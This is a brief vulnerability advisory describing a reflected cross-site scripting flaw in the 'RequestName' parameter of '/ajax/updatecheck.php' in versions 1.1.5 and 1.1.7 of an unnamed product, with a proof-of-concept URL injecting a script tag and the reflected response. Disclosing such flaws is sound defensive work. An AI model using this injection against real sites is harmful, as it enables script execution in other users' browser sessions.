Versions Affected: v.1.1.7, 1.1.5 (Other versions may also be affected)
Severity: Medium

Input passed to the 'RequestName' header parameter when posting to '/ajax/updatecheck.php' is not sanitized before it is returned to the user. This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.

Example:

http://somehost/ajax/updatecheck.php?PostBackKey=1&ExtensionKey=1&RequestName=1<script>alert(123)</script>

will return:

1<script>alert(123)</script>|[ERROR]There was a problem authenticating your post information.
